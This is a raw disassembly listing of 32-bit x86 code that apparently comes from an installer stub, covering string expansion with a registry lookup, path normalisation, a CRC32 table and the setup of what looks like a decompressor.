  406023:	ff 74 24 0c          	push   0xc(%esp)
  406027:	ff 15 30 71 40 00    	call   *0x407130
  40602d:	c2 08 00             	ret    $0x8
  406030:	ff 25 b4 70 40 00    	jmp    *0x4070b4
  406036:	ff 25 f8 70 40 00    	jmp    *0x4070f8
  40603c:	55                   	push   %ebp
  40603d:	8b ec                	mov    %esp,%ebp
  40603f:	83 ec 18             	sub    $0x18,%esp
  406042:	8b 45 0c             	mov    0xc(%ebp),%eax
  406045:	85 c0                	test   %eax,%eax
  406047:	7d 11                	jge    0x40605a
  406049:	8b 0d dc 81 42 00    	mov    0x4281dc,%ecx
  40604f:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  406056:	2b c8                	sub    %eax,%ecx
  406058:	8b 01                	mov    (%ecx),%eax
  40605a:	8b 0d 38 92 42 00    	mov    0x429238,%ecx
  406060:	53                   	push   %ebx
  406061:	56                   	push   %esi
  406062:	57                   	push   %edi
  406063:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  406066:	b8 a0 71 42 00       	mov    $0x4271a0,%eax
  40606b:	39 45 08             	cmp    %eax,0x8(%ebp)
  40606e:	8b f0                	mov    %eax,%esi
  406070:	0f 82 12 02 00 00    	jb     0x406288
  406076:	8b 55 08             	mov    0x8(%ebp),%edx
  406079:	2b d0                	sub    %eax,%edx
  40607b:	d1 fa                	sar    $1,%edx
  40607d:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  406083:	0f 83 ff 01 00 00    	jae    0x406288
  406089:	8b 75 08             	mov    0x8(%ebp),%esi
  40608c:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  406090:	e9 f3 01 00 00       	jmp    0x406288
  406095:	8b d6                	mov    %esi,%edx
  406097:	2b d0                	sub    %eax,%edx
  406099:	83 e2 fe             	and    $0xfffffffe,%edx
  40609c:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  4060a2:	0f 8d ec 01 00 00    	jge    0x406294
  4060a8:	6a 02                	push   $0x2
  4060aa:	5a                   	pop    %edx
  4060ab:	03 ca                	add    %edx,%ecx
  4060ad:	66 83 ff 04          	cmp    $0x4,%di
  4060b1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4060b4:	0f 83 bb 01 00 00    	jae    0x406275
  4060ba:	8a 41 01             	mov    0x1(%ecx),%al
  4060bd:	8a 09                	mov    (%ecx),%cl
  4060bf:	8a d0                	mov    %al,%dl
  4060c1:	8a d9                	mov    %cl,%bl
  4060c3:	83 e2 7f             	and    $0x7f,%edx
  4060c6:	83 e3 7f             	and    $0x7f,%ebx
  4060c9:	c1 e2 07             	shl    $0x7,%edx
  4060cc:	83 45 fc 02          	addl   $0x2,-0x4(%ebp)
  4060d0:	0b d3                	or     %ebx,%edx
  4060d2:	0f b6 d9             	movzbl %cl,%ebx
  4060d5:	0f b6 c0             	movzbl %al,%eax
  4060d8:	89 55 0c             	mov    %edx,0xc(%ebp)
  4060db:	8b d3                	mov    %ebx,%edx
  4060dd:	b9 00 80 00 00       	mov    $0x8000,%ecx
  4060e2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4060e5:	0b d1                	or     %ecx,%edx
  4060e7:	0b c1                	or     %ecx,%eax
  4060e9:	66 83 ff 02          	cmp    $0x2,%di
  4060ed:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4060f0:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4060f3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4060f6:	0f 85 1a 01 00 00    	jne    0x406216
  4060fc:	6a 02                	push   $0x2
  4060fe:	5f                   	pop    %edi
  4060ff:	ff 15 ac 70 40 00    	call   *0x4070ac
  406105:	85 c0                	test   %eax,%eax
  406107:	79 18                	jns    0x406121
  406109:	66 3d 04 5a          	cmp    $0x5a04,%ax
  40610d:	74 12                	je     0x406121
  40610f:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  406113:	74 0c                	je     0x406121
  406115:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  406119:	74 06                	je     0x406121
  40611b:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  40611f:	eb 07                	jmp    0x406128
  406121:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  406128:	83 3d 84 92 42 00 00 	cmpl   $0x0,0x429284
  40612f:	74 03                	je     0x406134
  406131:	6a 04                	push   $0x4
  406133:	5f                   	pop    %edi
  406134:	84 db                	test   %bl,%bl
  406136:	79 3a                	jns    0x406172
  406138:	8b c3                	mov    %ebx,%eax
  40613a:	83 e3 3f             	and    $0x3f,%ebx
  40613d:	83 e0 40             	and    $0x40,%eax
  406140:	50                   	push   %eax
  406141:	a1 38 92 42 00       	mov    0x429238,%eax
  406146:	56                   	push   %esi
  406147:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  40614a:	50                   	push   %eax
  40614b:	68 28 74 40 00       	push   $0x407428
  406150:	68 02 00 00 80       	push   $0x80000002
  406155:	e8 8d fd ff ff       	call   0x405ee7
  40615a:	66 83 3e 00          	cmpw   $0x0,(%esi)
  40615e:	0f 85 99 00 00 00    	jne    0x4061fd
  406164:	ff 75 f4             	push   -0xc(%ebp)
  406167:	56                   	push   %esi
  406168:	e8 cf fe ff ff       	call   0x40603c
  40616d:	e9 85 00 00 00       	jmp    0x4061f7
  406172:	83 fb 25             	cmp    $0x25,%ebx
  406175:	75 0e                	jne    0x406185
  406177:	68 00 04 00 00       	push   $0x400
  40617c:	56                   	push   %esi
  40617d:	ff 15 fc 70 40 00    	call   *0x4070fc
  406183:	eb 72                	jmp    0x4061f7
  406185:	83 fb 24             	cmp    $0x24,%ebx
  406188:	75 69                	jne    0x4061f3
  40618a:	68 00 04 00 00       	push   $0x400
  40618f:	56                   	push   %esi
  406190:	ff 15 a0 70 40 00    	call   *0x4070a0
  406196:	33 ff                	xor    %edi,%edi
  406198:	eb 59                	jmp    0x4061f3
  40619a:	a1 04 92 42 00       	mov    0x429204,%eax
  40619f:	33 c9                	xor    %ecx,%ecx
  4061a1:	4f                   	dec    %edi
  4061a2:	3b c1                	cmp    %ecx,%eax
  4061a4:	74 18                	je     0x4061be
  4061a6:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  4061a9:	74 13                	je     0x4061be
  4061ab:	56                   	push   %esi
  4061ac:	51                   	push   %ecx
  4061ad:	51                   	push   %ecx
  4061ae:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  4061b2:	ff 35 08 92 42 00    	push   0x429208
  4061b8:	ff d0                	call   *%eax
  4061ba:	85 c0                	test   %eax,%eax
  4061bc:	74 39                	je     0x4061f7
  4061be:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4061c1:	50                   	push   %eax
  4061c2:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  4061c6:	ff 35 08 92 42 00    	push   0x429208
  4061cc:	ff 15 7c 71 40 00    	call   *0x40717c
  4061d2:	85 c0                	test   %eax,%eax
  4061d4:	75 19                	jne    0x4061ef
  4061d6:	56                   	push   %esi
  4061d7:	ff 75 f8             	push   -0x8(%ebp)
  4061da:	ff 15 80 71 40 00    	call   *0x407180
  4061e0:	ff 75 f8             	push   -0x8(%ebp)
  4061e3:	8b d8                	mov    %eax,%ebx
  4061e5:	ff 15 a8 72 40 00    	call   *0x4072a8
  4061eb:	85 db                	test   %ebx,%ebx
  4061ed:	75 08                	jne    0x4061f7
  4061ef:	66 83 26 00          	andw   $0x0,(%esi)
  4061f3:	85 ff                	test   %edi,%edi
  4061f5:	75 a3                	jne    0x40619a
  4061f7:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4061fb:	74 11                	je     0x40620e
  4061fd:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  406201:	75 0b                	jne    0x40620e
  406203:	68 80 74 40 00       	push   $0x407480
  406208:	56                   	push   %esi
  406209:	e8 28 fe ff ff       	call   0x406036
  40620e:	56                   	push   %esi
  40620f:	e8 9a 00 00 00       	call   0x4062ae
  406214:	eb 4c                	jmp    0x406262
  406216:	66 83 ff 03          	cmp    $0x3,%di
  40621a:	75 33                	jne    0x40624f
  40621c:	83 7d 0c 1d          	cmpl   $0x1d,0xc(%ebp)
  406220:	75 0e                	jne    0x406230
  406222:	ff 35 08 92 42 00    	push   0x429208
  406228:	56                   	push   %esi
  406229:	e8 33 fd ff ff       	call   0x405f61
  40622e:	eb 12                	jmp    0x406242
  406230:	8b 45 0c             	mov    0xc(%ebp),%eax
  406233:	c1 e0 0b             	shl    $0xb,%eax
  406236:	05 00 a0 42 00       	add    $0x42a000,%eax
  40623b:	50                   	push   %eax
  40623c:	56                   	push   %esi
  40623d:	e8 d8 fd ff ff       	call   0x40601a
  406242:	8b 45 0c             	mov    0xc(%ebp),%eax
  406245:	83 c0 eb             	add    $0xffffffeb,%eax
  406248:	83 f8 07             	cmp    $0x7,%eax
  40624b:	73 15                	jae    0x406262
  40624d:	eb bf                	jmp    0x40620e
  40624f:	66 83 ff 01          	cmp    $0x1,%di
  406253:	75 0d                	jne    0x406262
  406255:	83 c8 ff             	or     $0xffffffff,%eax
  406258:	2b 45 0c             	sub    0xc(%ebp),%eax
  40625b:	50                   	push   %eax
  40625c:	56                   	push   %esi
  40625d:	e8 da fd ff ff       	call   0x40603c
  406262:	56                   	push   %esi
  406263:	e8 c8 fd ff ff       	call   0x406030
  406268:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40626b:	8d 34 46             	lea    (%esi,%eax,2),%esi
  40626e:	b8 a0 71 42 00       	mov    $0x4271a0,%eax
  406273:	eb 13                	jmp    0x406288
  406275:	75 0c                	jne    0x406283
  406277:	66 8b 39             	mov    (%ecx),%di
  40627a:	66 89 3e             	mov    %di,(%esi)
  40627d:	03 f2                	add    %edx,%esi
  40627f:	03 ca                	add    %edx,%ecx
  406281:	eb 05                	jmp    0x406288
  406283:	66 89 3e             	mov    %di,(%esi)
  406286:	03 f2                	add    %edx,%esi
  406288:	66 8b 39             	mov    (%ecx),%di
  40628b:	66 85 ff             	test   %di,%di
  40628e:	0f 85 01 fe ff ff    	jne    0x406095
  406294:	66 83 26 00          	andw   $0x0,(%esi)
  406298:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40629c:	5f                   	pop    %edi
  40629d:	5e                   	pop    %esi
  40629e:	5b                   	pop    %ebx
  40629f:	74 09                	je     0x4062aa
  4062a1:	50                   	push   %eax
  4062a2:	ff 75 08             	push   0x8(%ebp)
  4062a5:	e8 70 fd ff ff       	call   0x40601a
  4062aa:	c9                   	leave
  4062ab:	c2 08 00             	ret    $0x8
  4062ae:	55                   	push   %ebp
  4062af:	56                   	push   %esi
  4062b0:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4062b4:	57                   	push   %edi
  4062b5:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  4062b9:	75 18                	jne    0x4062d3
  4062bb:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  4062c0:	75 11                	jne    0x4062d3
  4062c2:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  4062c7:	75 0a                	jne    0x4062d3
  4062c9:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  4062ce:	75 03                	jne    0x4062d3
  4062d0:	83 c6 08             	add    $0x8,%esi
  4062d3:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4062d7:	74 0d                	je     0x4062e6
  4062d9:	56                   	push   %esi
  4062da:	e8 66 f7 ff ff       	call   0x405a45
  4062df:	85 c0                	test   %eax,%eax
  4062e1:	74 03                	je     0x4062e6
  4062e3:	83 c6 04             	add    $0x4,%esi
  4062e6:	66 8b 06             	mov    (%esi),%ax
  4062e9:	8b ee                	mov    %esi,%ebp
  4062eb:	66 85 c0             	test   %ax,%ax
  4062ee:	8b fe                	mov    %esi,%edi
  4062f0:	74 40                	je     0x406332
  4062f2:	53                   	push   %ebx
  4062f3:	8b 1d 4c 72 40 00    	mov    0x40724c,%ebx
  4062f9:	66 3d 1f 00          	cmp    $0x1f,%ax
  4062fd:	76 25                	jbe    0x406324
  4062ff:	50                   	push   %eax
  406300:	68 7c 95 40 00       	push   $0x40957c
  406305:	e8 f1 f6 ff ff       	call   0x4059fb
  40630a:	66 83 38 00          	cmpw   $0x0,(%eax)
  40630e:	75 14                	jne    0x406324
  406310:	56                   	push   %esi
  406311:	ff d3                	call   *%ebx
  406313:	2b c6                	sub    %esi,%eax
  406315:	d1 f8                	sar    $1,%eax
  406317:	50                   	push   %eax
  406318:	56                   	push   %esi
  406319:	57                   	push   %edi
  40631a:	e8 8b f8 ff ff       	call   0x405baa
  40631f:	57                   	push   %edi
  406320:	ff d3                	call   *%ebx
  406322:	8b f8                	mov    %eax,%edi
  406324:	56                   	push   %esi
  406325:	ff d3                	call   *%ebx
  406327:	8b f0                	mov    %eax,%esi
  406329:	66 8b 06             	mov    (%esi),%ax
  40632c:	66 85 c0             	test   %ax,%ax
  40632f:	75 c8                	jne    0x4062f9
  406331:	5b                   	pop    %ebx
  406332:	66 83 27 00          	andw   $0x0,(%edi)
  406336:	57                   	push   %edi
  406337:	55                   	push   %ebp
  406338:	ff 15 fc 71 40 00    	call   *0x4071fc
  40633e:	8b f8                	mov    %eax,%edi
  406340:	66 8b 07             	mov    (%edi),%ax
  406343:	66 3d 20 00          	cmp    $0x20,%ax
  406347:	74 06                	je     0x40634f
  406349:	66 3d 5c 00          	cmp    $0x5c,%ax
  40634d:	75 08                	jne    0x406357
  40634f:	66 83 27 00          	andw   $0x0,(%edi)
  406353:	3b ef                	cmp    %edi,%ebp
  406355:	72 df                	jb     0x406336
  406357:	5f                   	pop    %edi
  406358:	5e                   	pop    %esi
  406359:	5d                   	pop    %ebp
  40635a:	c2 04 00             	ret    $0x4
  40635d:	56                   	push   %esi
  40635e:	be 38 57 42 00       	mov    $0x425738,%esi
  406363:	56                   	push   %esi
  406364:	ff 74 24 0c          	push   0xc(%esp)
  406368:	ff 15 3c 71 40 00    	call   *0x40713c
  40636e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406371:	74 0b                	je     0x40637e
  406373:	50                   	push   %eax
  406374:	ff 15 50 71 40 00    	call   *0x407150
  40637a:	8b c6                	mov    %esi,%eax
  40637c:	eb 02                	jmp    0x406380
  40637e:	33 c0                	xor    %eax,%eax
  406380:	5e                   	pop    %esi
  406381:	c2 04 00             	ret    $0x4
  406384:	55                   	push   %ebp
  406385:	8b ec                	mov    %esp,%ebp
  406387:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  40638d:	56                   	push   %esi
  40638e:	be 04 01 00 00       	mov    $0x104,%esi
  406393:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406399:	56                   	push   %esi
  40639a:	50                   	push   %eax
  40639b:	ff 15 fc 70 40 00    	call   *0x4070fc
  4063a1:	3b c6                	cmp    %esi,%eax
  4063a3:	5e                   	pop    %esi
  4063a4:	76 02                	jbe    0x4063a8
  4063a6:	33 c0                	xor    %eax,%eax
  4063a8:	85 c0                	test   %eax,%eax
  4063aa:	74 0f                	je     0x4063bb
  4063ac:	66 83 bc 45 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,2)
  4063b3:	ff 5c 
  4063b5:	74 04                	je     0x4063bb
  4063b7:	33 c9                	xor    %ecx,%ecx
  4063b9:	eb 03                	jmp    0x4063be
  4063bb:	33 c9                	xor    %ecx,%ecx
  4063bd:	41                   	inc    %ecx
  4063be:	ff 75 08             	push   0x8(%ebp)
  4063c1:	8d 0c 4d 14 90 40 00 	lea    0x409014(,%ecx,2),%ecx
  4063c8:	8d 84 45 c4 fd ff ff 	lea    -0x23c(%ebp,%eax,2),%eax
  4063cf:	51                   	push   %ecx
  4063d0:	68 90 95 40 00       	push   $0x409590
  4063d5:	50                   	push   %eax
  4063d6:	ff 15 e0 71 40 00    	call   *0x4071e0
  4063dc:	83 c4 10             	add    $0x10,%esp
  4063df:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4063e5:	6a 08                	push   $0x8
  4063e7:	6a 00                	push   $0x0
  4063e9:	50                   	push   %eax
  4063ea:	ff 15 70 71 40 00    	call   *0x407170
  4063f0:	c9                   	leave
  4063f1:	c2 04 00             	ret    $0x4
  4063f4:	8b 44 24 04          	mov    0x4(%esp),%eax
  4063f8:	56                   	push   %esi
  4063f9:	8b f0                	mov    %eax,%esi
  4063fb:	57                   	push   %edi
  4063fc:	c1 e6 03             	shl    $0x3,%esi
  4063ff:	8b be e0 93 40 00    	mov    0x4093e0(%esi),%edi
  406405:	57                   	push   %edi
  406406:	ff 15 04 71 40 00    	call   *0x407104
  40640c:	85 c0                	test   %eax,%eax
  40640e:	75 0a                	jne    0x40641a
  406410:	57                   	push   %edi
  406411:	e8 6e ff ff ff       	call   0x406384
  406416:	85 c0                	test   %eax,%eax
  406418:	74 0f                	je     0x406429
  40641a:	ff b6 e4 93 40 00    	push   0x4093e4(%esi)
  406420:	50                   	push   %eax
  406421:	ff 15 00 71 40 00    	call   *0x407100
  406427:	eb 02                	jmp    0x40642b
  406429:	33 c0                	xor    %eax,%eax
  40642b:	5f                   	pop    %edi
  40642c:	5e                   	pop    %esi
  40642d:	c2 04 00             	ret    $0x4
  406430:	55                   	push   %ebp
  406431:	8b ec                	mov    %esp,%ebp
  406433:	83 ec 1c             	sub    $0x1c,%esp
  406436:	56                   	push   %esi
  406437:	8b 75 08             	mov    0x8(%ebp),%esi
  40643a:	57                   	push   %edi
  40643b:	8b 3d 0c 72 40 00    	mov    0x40720c,%edi
  406441:	eb 0a                	jmp    0x40644d
  406443:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406446:	50                   	push   %eax
  406447:	ff 15 08 72 40 00    	call   *0x407208
  40644d:	6a 01                	push   $0x1
  40644f:	56                   	push   %esi
  406450:	56                   	push   %esi
  406451:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406454:	6a 00                	push   $0x0
  406456:	50                   	push   %eax
  406457:	ff d7                	call   *%edi
  406459:	85 c0                	test   %eax,%eax
  40645b:	75 e6                	jne    0x406443
  40645d:	5f                   	pop    %edi
  40645e:	5e                   	pop    %esi
  40645f:	c9                   	leave
  406460:	c2 04 00             	ret    $0x4
  406463:	55                   	push   %ebp
  406464:	8b ec                	mov    %esp,%ebp
  406466:	81 ec 00 01 00 00    	sub    $0x100,%esp
  40646c:	33 c0                	xor    %eax,%eax
  40646e:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  406474:	50                   	push   %eax
  406475:	50                   	push   %eax
  406476:	68 00 01 00 00       	push   $0x100
  40647b:	51                   	push   %ecx
  40647c:	6a ff                	push   $0xffffffff
  40647e:	ff 75 0c             	push   0xc(%ebp)
  406481:	50                   	push   %eax
  406482:	50                   	push   %eax
  406483:	ff 15 60 71 40 00    	call   *0x407160
  406489:	85 c0                	test   %eax,%eax
  40648b:	74 12                	je     0x40649f
  40648d:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406493:	50                   	push   %eax
  406494:	ff 75 08             	push   0x8(%ebp)
  406497:	ff 15 00 71 40 00    	call   *0x407100
  40649d:	eb 02                	jmp    0x4064a1
  40649f:	33 c0                	xor    %eax,%eax
  4064a1:	c9                   	leave
  4064a2:	c2 08 00             	ret    $0x8
  4064a5:	83 3d 8c 6d 42 00 00 	cmpl   $0x0,0x426d8c
  4064ac:	56                   	push   %esi
  4064ad:	75 2d                	jne    0x4064dc
  4064af:	33 c9                	xor    %ecx,%ecx
  4064b1:	6a 08                	push   $0x8
  4064b3:	8b c1                	mov    %ecx,%eax
  4064b5:	5e                   	pop    %esi
  4064b6:	8b d0                	mov    %eax,%edx
  4064b8:	80 e2 01             	and    $0x1,%dl
  4064bb:	f6 da                	neg    %dl
  4064bd:	1b d2                	sbb    %edx,%edx
  4064bf:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  4064c5:	d1 e8                	shr    $1,%eax
  4064c7:	33 c2                	xor    %edx,%eax
  4064c9:	4e                   	dec    %esi
  4064ca:	75 ea                	jne    0x4064b6
  4064cc:	89 04 8d 88 6d 42 00 	mov    %eax,0x426d88(,%ecx,4)
  4064d3:	41                   	inc    %ecx
  4064d4:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4064da:	7c d5                	jl     0x4064b1
  4064dc:	8b 54 24 10          	mov    0x10(%esp),%edx
  4064e0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4064e4:	85 d2                	test   %edx,%edx
  4064e6:	f7 d0                	not    %eax
  4064e8:	76 23                	jbe    0x40650d
  4064ea:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4064ee:	57                   	push   %edi
  4064ef:	0f b6 39             	movzbl (%ecx),%edi
  4064f2:	8b f0                	mov    %eax,%esi
  4064f4:	81 e6 ff 00 00 00    	and    $0xff,%esi
  4064fa:	33 f7                	xor    %edi,%esi
  4064fc:	c1 e8 08             	shr    $0x8,%eax
  4064ff:	8b 34 b5 88 6d 42 00 	mov    0x426d88(,%esi,4),%esi
  406506:	33 c6                	xor    %esi,%eax
  406508:	41                   	inc    %ecx
  406509:	4a                   	dec    %edx
  40650a:	75 e3                	jne    0x4064ef
  40650c:	5f                   	pop    %edi
  40650d:	f7 d0                	not    %eax
  40650f:	5e                   	pop    %esi
  406510:	c2 0c 00             	ret    $0xc
  406513:	b8 80 00 00 00       	mov    $0x80,%eax
  406518:	48                   	dec    %eax
  406519:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  40651d:	75 f9                	jne    0x406518
  40651f:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406523:	33 c0                	xor    %eax,%eax
  406525:	40                   	inc    %eax
  406526:	89 41 68             	mov    %eax,0x68(%ecx)
  406529:	89 41 64             	mov    %eax,0x64(%ecx)
  40652c:	89 41 60             	mov    %eax,0x60(%ecx)
  40652f:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406532:	c3                   	ret
  406533:	55                   	push   %ebp
  406534:	8b ec                	mov    %esp,%ebp
  406536:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40653c:	53                   	push   %ebx
  40653d:	56                   	push   %esi
  40653e:	57                   	push   %edi
  40653f:	6a 22                	push   $0x22
  406541:	8b f1                	mov    %ecx,%esi
  406543:	59                   	pop    %ecx
  406544:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  40654a:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406550:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406552:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406556:	75 08                	jne    0x406560
  406558:	33 c0                	xor    %eax,%eax
  40655a:	40                   	inc    %eax
  40655b:	e9 20 0a 00 00       	jmp    0x406f80
  406560:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406563:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406566:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  40656c:	83 f8 1c             	cmp    $0x1c,%eax
  40656f:	0f 87 08 0a 00 00    	ja     0x406f7d
  406575:	ff 24 85 85 6f 40 00 	jmp    *0x406f85(,%eax,4)
  40657c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406580:	0f 84 e2 09 00 00    	je     0x406f68
  406586:	8b 45 90             	mov    -0x70(%ebp),%eax
  406589:	ff 4d 94             	decl   -0x6c(%ebp)
  40658c:	ff 45 90             	incl   -0x70(%ebp)
  40658f:	8a 00                	mov    (%eax),%al
  406591:	3c e1                	cmp    $0xe1,%al
  406593:	0f 87 e4 09 00 00    	ja     0x406f7d
  406599:	0f b6 c0             	movzbl %al,%eax
  40659c:	6a 2d                	push   $0x2d
  40659e:	99                   	cltd
  40659f:	59                   	pop    %ecx
  4065a0:	f7 f9                	idiv   %ecx
  4065a2:	6a 09                	push   $0x9
  4065a4:	59                   	pop    %ecx
  4065a5:	8b f0                	mov    %eax,%esi
  4065a7:	0f b6 c2             	movzbl %dl,%eax
  4065aa:	99                   	cltd
  4065ab:	f7 f9                	idiv   %ecx
  4065ad:	8b ce                	mov    %esi,%ecx
  4065af:	0f b6 fa             	movzbl %dl,%edi
  4065b2:	33 d2                	xor    %edx,%edx
  4065b4:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4065b7:	42                   	inc    %edx
  4065b8:	d3 e2                	shl    %cl,%edx
  4065ba:	8b c8                	mov    %eax,%ecx
  4065bc:	4a                   	dec    %edx
  4065bd:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4065c0:	33 d2                	xor    %edx,%edx
  4065c2:	42                   	inc    %edx
  4065c3:	d3 e2                	shl    %cl,%edx
  4065c5:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  4065c8:	be 00 03 00 00       	mov    $0x300,%esi
  4065cd:	d3 e6                	shl    %cl,%esi
  4065cf:	4a                   	dec    %edx
  4065d0:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4065d3:	81 c6 36 07 00 00    	add    $0x736,%esi
  4065d9:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  4065dc:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  4065df:	74 26                	je     0x406607
  4065e1:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4065e5:	74 09                	je     0x4065f0
  4065e7:	ff 75 fc             	push   -0x4(%ebp)
  4065ea:	ff 15 08 71 40 00    	call   *0x407108
  4065f0:	57                   	push   %edi
  4065f1:	6a 40                	push   $0x40
  4065f3:	ff 15 0c 71 40 00    	call   *0x40710c
  4065f9:	85 c0                	test   %eax,%eax
  4065fb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4065fe:	0f 84 79 09 00 00    	je     0x406f7d
  406604:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406607:	85 f6                	test   %esi,%esi
  406609:	74 0c                	je     0x406617
  40660b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40660e:	4e                   	dec    %esi
  40660f:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406615:	75 f4                	jne    0x40660b
  406617:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  40661b:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  40661f:	eb 26                	jmp    0x406647
  406621:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406625:	0f 84 a6 08 00 00    	je     0x406ed1
  40662b:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40662e:	ff 4d 94             	decl   -0x6c(%ebp)
  406631:	8b c8                	mov    %eax,%ecx
  406633:	8b 45 90             	mov    -0x70(%ebp),%eax
  406636:	c1 e1 03             	shl    $0x3,%ecx
  406639:	0f b6 00             	movzbl (%eax),%eax
  40663c:	d3 e0                	shl    %cl,%eax
  40663e:	09 45 c0             	or     %eax,-0x40(%ebp)
  406641:	ff 45 90             	incl   -0x70(%ebp)
  406644:	ff 45 b8             	incl   -0x48(%ebp)
  406647:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  40664b:	7c d4                	jl     0x406621
  40664d:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406650:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406653:	74 28                	je     0x40667d
  406655:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406659:	89 45 8c             	mov    %eax,-0x74(%ebp)
  40665c:	74 09                	je     0x406667
  40665e:	ff 75 f8             	push   -0x8(%ebp)
  406661:	ff 15 08 71 40 00    	call   *0x407108
  406667:	ff 75 c0             	push   -0x40(%ebp)
  40666a:	6a 40                	push   $0x40
  40666c:	ff 15 0c 71 40 00    	call   *0x40710c
  406672:	85 c0                	test   %eax,%eax
  406674:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406677:	0f 84 00 09 00 00    	je     0x406f7d
  40667d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406680:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406683:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  40668a:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  40668f:	eb 21                	jmp    0x4066b2
  406691:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406695:	0f 84 45 08 00 00    	je     0x406ee0
  40669b:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40669e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4066a1:	ff 4d 94             	decl   -0x6c(%ebp)
  4066a4:	0f b6 09             	movzbl (%ecx),%ecx
  4066a7:	c1 e0 08             	shl    $0x8,%eax
  4066aa:	0b c1                	or     %ecx,%eax
  4066ac:	ff 45 90             	incl   -0x70(%ebp)
  4066af:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4066b2:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4066b5:	ff 4d b8             	decl   -0x48(%ebp)
  4066b8:	85 c0                	test   %eax,%eax
  4066ba:	75 d5                	jne    0x406691
  4066bc:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4066bf:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4066c2:	23 45 e4             	and    -0x1c(%ebp),%eax
  4066c5:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  4066cc:	00 00 00 
  4066cf:	c1 e1 04             	shl    $0x4,%ecx
  4066d2:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4066d5:	03 c8                	add    %eax,%ecx
  4066d7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4066da:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  4066dd:	e9 6c 06 00 00       	jmp    0x406d4e
  4066e2:	33 d2                	xor    %edx,%edx
